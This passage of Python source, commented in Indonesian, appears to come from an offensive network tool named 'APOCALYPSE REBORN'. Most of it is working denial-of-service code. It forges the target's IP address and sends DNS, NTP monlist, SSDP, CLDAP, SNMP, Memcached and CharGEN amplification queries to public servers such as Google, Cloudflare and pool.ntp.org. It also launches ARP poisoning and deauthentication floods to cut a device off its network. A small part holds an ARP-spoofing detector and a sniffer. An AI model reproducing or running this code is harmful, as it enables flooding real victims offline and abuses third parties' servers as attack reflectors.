            "8.8.8.8", "8.8.4.4",           # Google DNS
            "1.1.1.1", "1.0.0.1",           # Cloudflare
            "9.9.9.9", "149.112.112.112",   # Quad9
            "208.67.222.222", "208.67.220.220",  # OpenDNS
            "64.6.64.6", "64.6.65.6",        # Verisign
            "84.200.69.80", "84.200.70.40",  # DNS.WATCH
            "8.26.56.26", "8.20.247.20",     # Comodo
            "77.88.8.8", "77.88.8.1",        # Yandex
            "185.228.168.9", "185.228.169.9", # CleanBrowsing
            "199.85.126.10", "199.85.127.10", # Neustar
            "156.154.70.1", "156.154.71.1",   # Neustar
            "45.90.28.0", "45.90.30.0",       # NextDNS
            "38.132.106.139", "194.0.0.1",    # UncensoredDNS
            "91.239.100.100", "89.233.43.71", # UncensoredDNS
            "176.103.130.130", "176.103.130.131", # AdGuard
            "94.140.14.14", "94.140.15.15",   # AdGuard
            "192.71.245.208", "192.71.245.209" # NordVPN
        ]
        
        # DNS Query Types (ANY akan return data paling besar)
        dns_qtypes = [255, 1, 2, 5, 6, 12, 15, 28]  # ANY, A, NS, CNAME, SOA, PTR, MX, AAAA
        
        # Domains dengan response besar (untuk amplification)
        large_domains = [
            "isc.org", "dnssec.net", "iana.org", "icann.org", "ripe.net",
            "apnic.net", "arin.net", "lacnic.net", "afrinic.net", "dnscookie.com",
            "nlnetlabs.nl", "powerdns.com", "bind.isc.org", "unbound.net",
            "knot-dns.cz", "dnsdist.org", "getdnsapi.net", "stubby.getdnsapi.net",
            "www.microsoft.com", "www.cisco.com", "www.cloudflare.com", "www.amazon.com",
            "www.google.com", "www.facebook.com", "www.youtube.com", "www.wikipedia.org"
        ]
        
        # ========== NTP AMPLIFICATION SERVERS (PALING BERBAHAYA - 556x!) ==========
        ntp_servers = [
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
            "time.google.com", "time.windows.com", "time.apple.com", "time.cloudflare.com",
            "ntp.ubuntu.com", "pool.ntp.org", "europe.pool.ntp.org", "asia.pool.ntp.org",
            "north-america.pool.ntp.org", "south-america.pool.ntp.org", "oceania.pool.ntp.org",
            "0.id.pool.ntp.org", "1.id.pool.ntp.org", "2.id.pool.ntp.org", "3.id.pool.ntp.org",
            "0.asia.pool.ntp.org", "1.asia.pool.ntp.org", "2.asia.pool.ntp.org", "3.asia.pool.ntp.org",
            # Hardcoded NTP servers
            "ntp1.t-online.de", "ntp2.t-online.de", "ntp3.t-online.de", "ntp4.t-online.de",
            "chronos.cruzio.com", "ntp.jst.mfeed.co.jp", "ntp.nict.jp", "ntp.nict.go.jp",
            "ntp2.nict.go.jp", "ntp.jst.mfeed.co.jp", "ntp1.vniiftri.ru", "ntp2.vniiftri.ru"
        ]
        
        # NTP Monlist command (mode 7) - untuk amplification
        # Packet NTP query untuk monlist (https://github.com/ntp-project/ntp/blob/stable/ntpd/ntp_control.c)
        # Monlist bisa return hingga 600+ IP addresses (20,000+ bytes per response!)
        
        # ========== SSDP AMPLIFICATION ==========
        ssdp_multicast = "239.255.255.250"
        ssdp_ports = [1900, 5000, 8000, 8080, 8888]
        
        ssdp_queries = [
            'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 10\r\nST: ssdp:all\r\n\r\n',
            'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: upnp:rootdevice\r\n\r\n',
            'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 5\r\nST: urn:schemas-upnp-org:device:MediaServer:1\r\n\r\n',
            'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: urn:schemas-upnp-org:service:ContentDirectory:1\r\n\r\n',
            'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 4\r\nST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n'
        ]
        
        # ========== CLDAP AMPLIFICATION ==========
        cldap_servers = [
            "8.8.8.8", "4.2.2.2", "4.2.2.3", "4.2.2.4", "4.2.2.5", "4.2.2.6",
            "208.67.222.222", "208.67.220.220", "1.1.1.1", "1.0.0.1", "9.9.9.9",
            "64.6.64.6", "64.6.65.6", "84.200.69.80", "84.200.70.40", "77.88.8.8",
            "77.88.8.1", "185.228.168.9", "185.228.169.9", "199.85.126.10", "199.85.127.10"
        ]
        
        # ========== SNMP AMPLIFICATION ==========
        snmp_servers = []
        for i in range(1, 255):
            snmp_servers.append(f"192.168.1.{i}")
            snmp_servers.append(f"10.0.0.{i}")
            snmp_servers.append(f"172.16.0.{i}")
        snmp_servers = list(set(snmp_servers))[:100]
        
        # SNMP Community Strings default
        snmp_communities = ["public", "private", "community", "snmp", "cablecom", "root", "admin", "password"]
        
        # SNMP OIDs yang return data besar
        snmp_oids = [
            "1.3.6.1.2.1.1.1.0",        # sysDescr
            "1.3.6.1.2.1.1.3.0",        # sysUpTime
            "1.3.6.1.2.1.1.4.0",        # sysContact
            "1.3.6.1.2.1.1.5.0",        # sysName
            "1.3.6.1.2.1.1.6.0",        # sysLocation
            "1.3.6.1.2.1.2.2.1.2",      # ifDescr
            "1.3.6.1.2.1.4.20.1.2",     # ipAdEntIfIndex
            "1.3.6.1.2.1.6.13.1.1",     # tcpConnState
            "1.3.6.1.2.1.25.1.1.0",     # hrSystemUptime
            "1.3.6.1.2.1.25.2.2.0",     # hrMemorySize
            "1.3.6.1.2.1.25.3.2.1.1",   # hrProcessorFrwID
            "1.3.6.1.2.1.25.4.2.1.2"    # hrSWRunName
        ]
        
        print(f"{C['R']}{EMO['nuclear']} [METHOD 27] ULTIMATE REFLECTION ATTACK - AMPLIFICATION 556x!{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - DNS Amplification: 28-54x factor{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - NTP Amplification: 556x factor (PALING BERBAHAYA!){C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - SSDP Amplification: 30-75x factor{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - CLDAP Amplification: 46-70x factor{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - SNMP Amplification: 10-25x factor{C['RESET']}")
        
        def reflection_worker(thread_id):
            idx = 0
            while self.running and not self.stop_event.is_set():
                try:
                    # ========== 1. DNS AMPLIFICATION ATTACK ==========
                    # Mengirim DNS query palsu ke DNS server dengan source IP = target
                    for dns_server in random.sample(dns_servers, min(5, len(dns_servers))):
                        for domain in random.sample(large_domains, min(3, len(large_domains))):
                            for qtype in random.sample(dns_qtypes, min(3, len(dns_qtypes))):
                                # Buat DNS query packet
                                dns_query = IP(src=target_ip, dst=dns_server)/UDP(sport=random.randint(1024,65535), dport=53)/DNS(
                                    id=random.randint(1, 65535),
                                    qr=0,
                                    qd=DNSQR(qname=domain, qtype=qtype, qclass=1)
                                )
                                send(dns_query, verbose=False, iface=self.interface, count=2)
                                self.total_packets += 2
                                self.packet_stats['DNS_AMPLIFICATION'] += 2
                    
                    # ========== 2. NTP AMPLIFICATION ATTACK (PALING BERBAHAYA) ==========
                    # NTP Monlist query - amplifikasi 556x!
                    # Packet: IP(src=target_ip, dst=ntp_server)/UDP(sport=123, dport=123)/Raw(load=ntp_monlist_packet)
                    # Monlist command: \x17\x00\x03\x2a + \x00*44 (NTP control packet untuk monlist)
                    ntp_monlist_packet = b'\x17\x00\x03\x2a' + b'\x00' * 44
                    
                    for ntp_server in random.sample(ntp_servers, min(5, len(ntp_servers))):
                        try:
                            # Resolve NTP server domain to IP
                            ntp_ip = socket.gethostbyname(ntp_server)
                            
                            # Send NTP monlist query (amplification up to 556x!)
                            p_ntp_monlist = IP(src=target_ip, dst=ntp_ip)/UDP(sport=123, dport=123)/Raw(load=ntp_monlist_packet)
                            send(p_ntp_monlist, verbose=False, iface=self.interface, count=5)
                            self.total_packets += 5
                            self.packet_stats['NTP_MONLIST'] += 5
                            
                            # Send NTP query (mode 3 - client)
                            ntp_query = b'\x1b' + 47 * b'\x00'
                            p_ntp_query = IP(src=target_ip, dst=ntp_ip)/UDP(sport=123, dport=123)/Raw(load=ntp_query)
                            send(p_ntp_query, verbose=False, iface=self.interface, count=3)
                            self.total_packets += 3
                            self.packet_stats['NTP_QUERY'] += 3
                        except:
                            pass
                    
                    # ========== 3. SSDP AMPLIFICATION ATTACK ==========
                    # SSDP discovery request ke multicast dengan source IP = target
                    for ssdp_port in ssdp_ports:
                        for query in ssdp_queries:
                            p_ssdp = IP(src=target_ip, dst=ssdp_multicast)/UDP(sport=random.randint(1024,65535), dport=ssdp_port)/Raw(load=query.encode())
                            send(p_ssdp, verbose=False, iface=self.interface, count=3)
                            self.total_packets += 3
                            self.packet_stats['SSDP_AMPLIFICATION'] += 3
                    
                    # ========== 4. CLDAP AMPLIFICATION ATTACK ==========
                    # CLDAP query ke server dengan source IP = target
                    for cldap_server in random.sample(cldap_servers, min(3, len(cldap_servers))):
                        # CLDAP Search Request packet
                        # Base DN: dc=example,dc=com
                        # Filter: (objectClass=*)
                        cldap_payload = b'\x30\x84\x00\x00\x00\x2b\x02\x01\x01\x63\x84\x00\x00\x00\x17\x04\x0e\x64\x63\x3d\x65\x78\x61\x6d\x70\x6c\x65\x2c\x64\x63\x3d\x63\x6f\x6d\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\xa0\x84\x00\x00\x00\x00\x30\x84\x00\x00\x00\x00'
                        p_cldap = IP(src=target_ip, dst=cldap_server)/UDP(sport=random.randint(1024,65535), dport=389)/Raw(load=cldap_payload)
                        send(p_cldap, verbose=False, iface=self.interface, count=4)
                        self.total_packets += 4
                        self.packet_stats['CLDAP_AMPLIFICATION'] += 4
                    
                    # ========== 5. SNMP AMPLIFICATION ATTACK ==========
                    # SNMP query ke device dengan source IP = target
                    for snmp_server in random.sample(snmp_servers, min(10, len(snmp_servers))):
                        for community in random.sample(snmp_communities, min(3, len(snmp_communities))):
                            for oid in random.sample(snmp_oids, min(3, len(snmp_oids))):
                                # Buat SNMP GET request packet
                                # ASN.1 BER encoding untuk SNMP
                                # Version (0), Community (public), PDU type (GET), Request ID, OID
                                community_bytes = community.encode()
                                oid_bytes = oid.encode()
                                
                                # Simple SNMP GET request packet
                                snmp_payload = (
                                    b'\x30' +  # SEQUENCE
                                    len(community_bytes).to_bytes(1, 'big') +
                                    community_bytes +
                                    b'\xa0' +  # GetRequest PDU
                                    b'\x1c' +  # Length
                                    b'\x02\x01\x01' +  # Request ID
                                    b'\x02\x01\x00' +  # Error status
                                    b'\x02\x01\x00' +  # Error index
                                    b'\x30' +  # VarBindList
                                    b'\x0e' +  # Length
                                    b'\x30' +  # VarBind
                                    b'\x0c' +  # Length
                                    b'\x06' +  # OID
                                    len(oid_bytes).to_bytes(1, 'big') +
                                    oid_bytes +
                                    b'\x05\x00'  # Null value
                                )
                                
                                p_snmp = IP(src=target_ip, dst=snmp_server)/UDP(sport=random.randint(1024,65535), dport=161)/Raw(load=snmp_payload)
                                send(p_snmp, verbose=False, iface=self.interface, count=2)
                                self.total_packets += 2
                                self.packet_stats['SNMP_AMPLIFICATION'] += 2
                    
                    # ========== 6. ADDITIONAL: Memcached AMPLIFICATION ==========
                    memcached_servers = []
                    for i in range(1, 255):
                        memcached_servers.append(f"192.168.1.{i}")
                        memcached_servers.append(f"10.0.0.{i}")
                    memcached_servers = list(set(memcached_servers))[:50]
                    
                    for memcached_server in random.sample(memcached_servers, min(5, len(memcached_servers))):
                        # Memcached stats command (amplifikasi besar!)
                        memcached_payload = b'stats\r\n'
                        p_memcached = IP(src=target_ip, dst=memcached_server)/UDP(sport=random.randint(1024,65535), dport=11211)/Raw(load=memcached_payload)
                        send(p_memcached, verbose=False, iface=self.interface, count=5)
                        self.total_packets += 5
                        self.packet_stats['MEMCACHED_AMPLIFICATION'] += 5
                    
                    # ========== 7. ADDITIONAL: CharGEN Amplification ==========
                    chargen_servers = []
                    for i in range(1, 255):
                        chargen_servers.append(f"192.168.1.{i}")
                        chargen_servers.append(f"10.0.0.{i}")
                    chargen_servers = list(set(chargen_servers))[:30]
                    
                    for chargen_server in random.sample(chargen_servers, min(3, len(chargen_servers))):
                        # CharGEN protocol - akan reply dengan data random terus menerus
                        p_chargen = IP(src=target_ip, dst=chargen_server)/UDP(sport=random.randint(1024,65535), dport=19)/Raw(load=b'\x00')
                        send(p_chargen, verbose=False, iface=self.interface, count=10)
                        self.total_packets += 10
                        self.packet_stats['CHARGEN_AMPLIFICATION'] += 10
                    
                    idx += 1
                    time.sleep(0.01)  # Delay kecil agar tidak overload attacker
                    
                except Exception as e:
                    pass
        
        # Jalankan 6 thread untuk reflection attack
        for i in range(6):
            t = threading.Thread(target=reflection_worker, args=(i,))
            t.daemon = True
            t.start()
            self.packet_stats[f'REFLECTION_THREAD_{i}'] = 1

    # ============================================================================
    # APOCALYPSE REBORN - MAIN BLOCK FUNCTION
    # ============================================================================
    def block_device_apocalypse(self, target_ip):
        """
        ============================================================================
        APOCALYPSE REBORN v2.9 - GABUNGAN KEKUATAN 1.0 + 2.1 + 2.5
        ============================================================================
        - Lightning fast ARP poisoning (dari v1.0)
        - Ultra deauth flood (dari v2.5)
        - Multi protocol storm (gabungan)
        - Rate: 50,000+ packet per detik
        - Efek: PUTUS DALAM 2-3 DETIK!
        ============================================================================
        """
        os.system('cls' if os.name == 'nt' else 'clear')
        
        print(f"\n{C['BOLD']}{C['R']}{'='*100}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{EMO['apocalypse']} ⚡ APOCALYPSE REBORN v2.9 - TOTAL ANNIHILATION ⚡ {EMO['death']}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{'='*100}{C['RESET']}")
        
        wifi_ssid = self.get_wifi_ssid()
        print(f"{C['M']}{EMO['wifi']} [TARGET NETWORK] {C['BOLD']}{C['G']}{wifi_ssid}{C['RESET']}")
        print(f"{C['R']}{EMO['danger']} ⚠️ [WARNING] LIGHTNING MODE - WILL DISCONNECT IN 2-3 SECONDS! ⚠️{C['RESET']}")
        
        if target_ip not in self.arp_table:
            print(f"{C['Y']}{EMO['scan']} [SCANNING] Target not in cache, scanning...{C['RESET']}")
            self.scan_network()
        
        if target_ip not in self.arp_table:
            print(f"{C['R']}{EMO['cross']} [ERROR] Target not found!{C['RESET']}")
            return
        
        target_mac = self.arp_table[target_ip]
        gateway_ip, gateway_mac = self.get_gateway()
        
        if not gateway_ip:
            print(f"{C['R']}{EMO['cross']} [ERROR] Cannot detect gateway!{C['RESET']}")
            return
        
        vendor = self.vendor_db.get_vendor(target_mac)
        
        print(f"""
{C['R']}{'█'*100}{C['RESET']}
{C['BOLD']}{C['R']}💀 TARGET ACQUIRED - PREPARING 25+ METHODS (REBORN EDITION) 💀{C['RESET']}
{C['R']}{'█'*100}{C['RESET']}
{C['Y']}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│  {C['W']}[TARGET IP]     {C['R']}{target_ip:<57}{C['Y']}│
│  {C['W']}[DEVICE TYPE]   {C['R']}{vendor:<57}{C['Y']}│
│  {C['W']}[GATEWAY]       {C['R']}{gateway_ip:<57}{C['Y']}│
│  {C['W']}[METHODS]       {C['R']}LIGHTNING ARP + ULTRA DEAUTH + MULTI PROTOCOL STORM{C['Y']}│
│  {C['W']}[SPEED]         {C['R']}50,000+ PACKETS PER SECOND - PUTUS DALAM 2-3 DETIK!{C['Y']}│
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
        """)
        
        confirm = input(f"\n{C['R']}{EMO['death']} [CONFIRM] Type 'REBORN' to start ultimate annihilation: {C['RESET']}")
        if confirm.upper() != 'REBORN':
            print(f"{C['Y']}{EMO['cross']} [CANCELLED] Operation cancelled{C['RESET']}")
            return
        
        print(f"\n{C['R']}{EMO['apocalypse']} [ATTACK] LAUNCHING 25+ METHODS - LIGHTNING SPEED MODE... {EMO['fire']}{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']} [INFO] Press Ctrl+C to stop (auto-restore){C['RESET']}\n")
        
        self.running = True
        self.stop_event.clear()
        self.total_packets = 0
        self.start_time_attack = time.time()
        self.blocked_devices[target_ip] = {
            'mac': target_mac,
            'vendor': vendor,
            'start_time': datetime.now(),
            'methods': 25,
            'version': '2.9-REBORN-EDITION'
        }
        
        self.log_event('APOCALYPSE_REBORN', target_ip, f'25+ methods on {vendor} - LIGHTNING MODE', 'CRITICAL')
        
        # Launch all attack methods
        print(f"{C['G']}[+] METHOD 1-10: LIGHTNING ARP POISONING (10 threads - 20,000+ pps){C['RESET']}")
        self.lightning_arp_poison(target_ip, target_mac, gateway_ip, gateway_mac)
        
        if os.name != 'nt':
            print(f"{C['G']}[+] METHOD 11-25: ULTRA DEAUTH FLOOD (15 threads - 5,000+ pps){C['RESET']}")
            self.ultra_deauth_flood(target_mac, gateway_mac)
        
        print(f"{C['R']}{EMO['nuclear']}[!!!] METHOD 26+: MULTI PROTOCOL STORM - MOST DANGEROUS! (8 threads - 25,000+ pps){C['RESET']}")
        self.multi_protocol_storm(target_ip, target_mac, gateway_ip, gateway_mac)

        print(f"{C['R']}{EMO['nuclear']}[!!!] METHOD 27: ULTIMATE REFLECTION ATTACK - AMPLIFICATION 556x! (6 threads){C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - DNS Amplification: 28-54x factor{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - NTP Amplification: 556x factor (PALING BERBAHAYA!){C['RESET']}")
        print(f"{C['Y']}{EMO['alert']}   - SSDP Amplification: 30-75x factor{C['RESET']}")
        self.ultimate_reflection_attack(target_ip, target_mac, gateway_ip, gateway_mac)
        
        try:
            # Ultra fast progress display
            spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
            spin_idx = 0
            target_short = target_ip[:15]
            
            print()
            with tqdm(total=100, desc=f"{C['R']}💀 ANNIHILATING {target_short}{C['RESET']}", 
                      unit="%", colour="red", bar_format="{l_bar}{bar}{r_bar}") as pbar:
                last_packets = 0
                last_time = time.time()
                while self.running:
                    time.sleep(0.1)
                    total_packets = self.total_packets
                    elapsed = time.time() - self.start_time_attack
                    
                    # Progress based on packets (target 5000 packets = 100%)
                    progress = min(99, int((total_packets / 3000) * 100))
                    if total_packets > 0 and progress == 0:
                        progress = 1
                    
                    pbar.update(progress - pbar.n)
                    
                    # Calculate packet rate
                    now = time.time()
                    pps = int((total_packets - last_packets) / max(0.01, (now - last_time))) if last_packets > 0 else 0
                    last_packets = total_packets
                    last_time = now
                    
                    pbar.set_postfix_str(
                        f"PKT: {total_packets:,} | PPS: {pps} | TIME: {int(elapsed)}s | SPEED: LIGHTNING"
                    )
                    
                    # Spinner animation
                    spinner_char = spinner[spin_idx % len(spinner)]
                    spin_idx += 1
                    sys.stdout.write(f"\r{C['W']}{spinner_char}{C['RESET']}")
                    sys.stdout.flush()
                    
        except KeyboardInterrupt:
            self.running = False
            self.stop_event.set()
            self.restore_network()
            
            duration = int(time.time() - self.start_time_attack)
            total_packets = self.total_packets
            
            print(f"\n\n{C['G']}{'='*100}{C['RESET']}")
            print(f"{C['G']}{EMO['check']} APOCALYPSE REBORN - ANNIHILATION COMPLETE!{C['RESET']}")
            print(f"{C['G']}{'='*100}{C['RESET']}")
            
            avg_pps = int(total_packets / max(1, duration))
            
            print(f"""
{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
{C['Y']}║                         📊 APOCALYPSE REBORN - ANNIHILATION REPORT 📊                              ║
{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['BOLD']}{C['C']}⏱️  Duration:          {C['W']}{duration} seconds{C['RESET']}
{C['BOLD']}{C['C']}📦 Total Packets:     {C['W']}{total_packets:,} packets{C['RESET']}
{C['BOLD']}{C['C']}⚡ Packet Rate:       {C['W']}{avg_pps:,} pps (LIGHTNING SPEED!){C['RESET']}
{C['BOLD']}{C['C']}⚔️  Methods Used:      {C['W']}25+ METHODS (ARP + DEAUTH + MULTI PROTOCOL){C['RESET']}
{C['BOLD']}{C['C']}🧵 Max Threads:       {C['W']}100+ Concurrent Threads{C['RESET']}
{C['BOLD']}{C['C']}🎯 Target:            {C['W']}{target_ip} ({vendor}){C['RESET']}
{C['BOLD']}{C['C']}💀 Status:            {C['R']}TOTAL NEUTRALIZATION - DISCONNECTED IN {duration} SECONDS{C['RESET']}

{C['G']}🛡️  [RESTORE] Network restored! Target can now reconnect.{C['RESET']}
            """)
            
            # Show breakdown
            print(f"\n{C['BOLD']}{C['M']}{'='*100}{C['RESET']}")
            print(f"{C['BOLD']}{C['M']}                    📊 ATTACK BREAKDOWN - REBORN EDITION 📊{C['RESET']}")
            print(f"{C['BOLD']}{C['M']}{'='*100}{C['RESET']}")
            print(f"  {C['G']}→ LIGHTNING ARP POISONING : 10 threads, 20,000+ pps")
            if os.name != 'nt':
                print(f"  {C['G']}→ ULTRA DEAUTH FLOOD     : 15 threads, 5,000+ pps")
            print(f"  {C['G']}→ MULTI PROTOCOL STORM    : 8 threads, 25,000+ pps")
            print(f"  {C['G']}→ TOTAL PACKETS           : {total_packets:,}")
            print(f"  {C['G']}→ AVERAGE PPS             : {avg_pps:,}")
            print(f"{C['M']}{'='*100}{C['RESET']}")
            
            del self.blocked_devices[target_ip]
            self.log_event('APOCALYPSE_REBORN_END', target_ip, 
                          f'Stopped after {duration}s, {total_packets} packets, {avg_pps} pps', 'INFO')
            input(f"\n{C['Y']}[ENTER] Press Enter to continue...{C['RESET']}")
            return True
        
        return True

    def restore_network(self):
        print(f"\n{C['C']}{EMO['protect']} [RESTORE] Restoring network to normal...{C['RESET']}")
        
        try:
            gateway_ip, gateway_mac = self.get_gateway()
            if gateway_ip and gateway_mac:
                print(f"{C['Y']}[*] Sending correct ARP replies...{C['RESET']}")
                for ip, mac in self.arp_table.items():
                    if mac and mac != "ff:ff:ff:ff:ff:ff":
                        packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=gateway_ip, hwsrc=gateway_mac)
                        send(packet, count=5, verbose=False, iface=self.interface)
                
                packet_bcast = ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=gateway_ip, hwsrc=gateway_mac)
                send(packet_bcast, count=3, verbose=False, iface=self.interface)
            
            if os.name == 'nt':
                subprocess.run(['arp', '-d'], capture_output=True)
                subprocess.run(['netsh', 'interface', 'ip', 'delete', 'arpcache'], capture_output=True)
            else:
                subprocess.run(['ip', 'neigh', 'flush', 'all'], capture_output=True)
            
            self.blocked_devices.clear()
            self.packet_stats.clear()
            self.stop_event.set()
            self.running = False
            self.total_packets = 0
            
            print(f"{C['G']}{EMO['check']} [SUCCESS] Network restored successfully!{C['RESET']}")
            self.log_event('RESTORE', 'NETWORK', 'Network restored to normal', 'INFO')
            
        except Exception as e:
            print(f"{C['R']}{EMO['cross']} [ERROR] Restore failed: {e}{C['RESET']}")

    # ========== MENU FUNCTIONS ==========
    def arp_spoofing_detection(self, duration=60):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['protect']} PRO ARP SPOOFING DETECTOR {EMO['protect']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        gateway_ip, gateway_mac = self.get_gateway()
        if not gateway_ip:
            print(f"{C['R']}Cannot detect gateway!{C['RESET']}")
            return
        
        print(f"\n{C['C']}Gateway: {gateway_ip} -> {gateway_mac}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} Monitoring for {duration} seconds...{C['RESET']}")
        
        detected = False
        attack_count = defaultdict(int)
        
        def arp_monitor(pkt):
            nonlocal detected
            if pkt.haslayer(ARP) and pkt[ARP].op == 2:
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                if ip == gateway_ip and gateway_mac and mac != gateway_mac:
                    attack_count[mac] += 1
                    if attack_count[mac] >= 3 and not detected:
                        detected = True
                        print(f"\n{C['R']}{EMO['danger']} ARP SPOOFING ATTACK DETECTED!{C['RESET']}")
                        print(f"  {C['Y']}Target IP: {ip}")
                        print(f"  {C['G']}Real MAC: {gateway_mac}")
                        print(f"  {C['R']}Fake MAC: {mac}")
                        print(f"  {C['R']}Attacker: {self.vendor_db.get_vendor(mac)}{C['RESET']}")
        
        try:
            sniff(prn=arp_monitor, filter="arp", timeout=duration, iface=self.interface, store=0)
        except Exception as e:
            print(f"{C['R']}Sniffing error: {e}{C['RESET']}")
        
        if not detected:
            print(f"\n{C['G']}{EMO['check']} SAFE! No ARP spoofing detected{C['RESET']}")
        return detected, []
    
    def packet_sniffer_live(self, count=200):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['packet']} LIVE PACKET SNIFFER PRO {EMO['packet']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        print(f"\n{C['C']}Target: {count} packets{C['RESET']}")
        print(f"{C['Y']}Press Ctrl+C to stop{C['RESET']}\n")
        
        packets = []
        protocol_stats = defaultdict(int)
        ip_stats = defaultdict(int)
        
        def packet_callback(pkt):
            if len(packets) < count:
                packets.append(pkt)
                if pkt.haslayer(IP):
                    proto = pkt[IP].proto
                    proto_name = {6:'TCP', 17:'UDP', 1:'ICMP'}.get(proto, f'P-{proto}')
                    protocol_stats[proto_name] += 1
                    ip_stats[pkt[IP].src] += 1
                    
                    sys.stdout.write(f"\r{C['G']}Captured:{C['RESET']} {len(packets)}/{count} | "
                                   f"{C['C']}TCP:{C['RESET']}{protocol_stats['TCP']} "
                                   f"{C['B']}UDP:{C['RESET']}{protocol_stats['UDP']} "
                                   f"{C['Y']}ICMP:{C['RESET']}{protocol_stats['ICMP']} | "
                                   f"{C['M']}Unique IPs:{C['RESET']}{len(ip_stats)}")
                    sys.stdout.flush()
        
        try:
            sniff(prn=packet_callback, count=count, iface=self.interface, timeout=60, store=0)
            print(f"\n\n{C['G']}{EMO['check']} Capture complete! {len(packets)} packets{C['RESET']}")
            return packets
        except KeyboardInterrupt:
            print(f"\n{C['Y']}{EMO['alert']} Sniffer stopped by user{C['RESET']}")
            return packets
        except Exception as e:
            print(f"\n{C['R']}Error: {e}{C['RESET']}")
            return []
    
    def show_attack_logs(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['database']} ATTACK LOG HISTORY {EMO['database']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        if not self.attack_log:
            print(f"\n{C['Y']}No logs available{C['RESET']}")
            return
        
        print(f"\n{C['BOLD']}{'No.':<5} {'Time':<12} {'Event Type':<22} {'Target':<20} {'Severity':<10}{C['RESET']}")
        print(f"{C['C']}{'-'*70}{C['RESET']}")
        
        for i, log in enumerate(self.attack_log[-30:], 1):
            severity_color = C['R'] if log['severity'] == 'CRITICAL' else C['Y'] if log['severity'] == 'HIGH' else C['G']
            print(f"{i:<5} {log['timestamp'][11:19]:<12} {log['event_type']:<22} {log['target'][:20]:<20} {severity_color}{log['severity']:<10}{C['RESET']}")
        
        print(f"{C['C']}{'='*70}{C['RESET']}")
        print(f"\n{C['Y']}Total logs: {len(self.attack_log)}{C['RESET']}")
        print(f"{C['Y']}Log file: {self.log_file}{C['RESET']}")
    
    def show_detailed_system_info(self):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['info']} SYSTEM INFORMATION {EMO['info']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        wifi_ssid = self.get_wifi_ssid()
        print(f"\n{C['BOLD']}{C['G']}{EMO['net']} NETWORK INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}Interface:{C['RESET']} {self.interface}")
        print(f"  {C['Y']}WiFi Name:{C['RESET']} {C['BOLD']}{C['G']}{wifi_ssid}{C['RESET']}")
        print(f"  {C['Y']}Your IP:{C['RESET']} {self.get_my_ip()}")
        print(f"  {C['Y']}Your MAC:{C['RESET']} {self.get_my_mac()}")
        print(f"  {C['Y']}Gateway IP:{C['RESET']} {self.gateway_ip}")
        print(f"  {C['Y']}Gateway MAC:{C['RESET']} {self.gateway_mac}")
        
        print(f"\n{C['BOLD']}{C['B']}{EMO['tool']} SYSTEM INFORMATION:{C['RESET']}")
        print(f"  {C['Y']}OS:{C['RESET']} {platform.system()} {platform.release()}")
        print(f"  {C['Y']}Python:{C['RESET']} {sys.version.split()[0]}")
        print(f"  {C['Y']}Hostname:{C['RESET']} {socket.gethostname()}")
        print(f"  {C['Y']}Admin:{C['RESET']} Yes")
        
        print(f"\n{C['BOLD']}{C['M']}{EMO['stats']} STATISTICS:{C['RESET']}")
        print(f"  {C['Y']}Devices in ARP Cache:{C['RESET']} {len(self.arp_table)}")
        print(f"  {C['Y']}Total Events Logged:{C['RESET']} {len(self.attack_log)}")
        print(f"  {C['Y']}Total Packets Sent:{C['RESET']} {self.total_packets:,}")
        print(f"  {C['Y']}Log File:{C['RESET']} {self.log_file}")
        print(f"  {C['Y']}Version:{C['RESET']} v2.9 REBORN EDITION")
        print(f"  {C['Y']}Speed Mode:{C['RESET']} {'LIGHTNING (50,000+ pps)' if ULTRA_SPEED_MODE else 'NORMAL'}")
    
    def network_backup(self):
